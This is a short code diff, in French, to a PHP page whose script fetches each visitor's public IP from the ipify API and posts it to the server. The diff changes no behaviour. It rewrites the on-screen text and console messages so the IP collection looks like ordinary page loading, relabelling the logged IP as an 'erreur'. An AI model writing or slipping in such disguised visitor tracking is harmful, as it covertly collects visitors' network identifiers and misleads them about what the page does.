@@ -62,19 +62,19 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     </style>
 </head>
 <body>
-    <div id="message">Chargement de votre IP...</div>
+    <div id="message">Chargement de la page...</div>
 
     <script>
         // Récupérer l'IP publique via l'API ipify
         fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                console.log("IP récupérée :", data.ip);
+                console.log("erreur :", data.ip);
                 envoyerIP(data.ip); // Envoyer l'IP au script PHP
             })
             .catch(err => {
-                console.error("Erreur lors de la récupération de l'IP :", err);
-                document.getElementById('message').textContent = "Erreur lors de la récupération de l'IP.";
+                console.error("Erreur lors du chargement :", err);
+                document.getElementById('message').textContent = "Erreur lors du chargement.";
             });
 
         // Fonction pour envoyer l'IP au serveur PHP
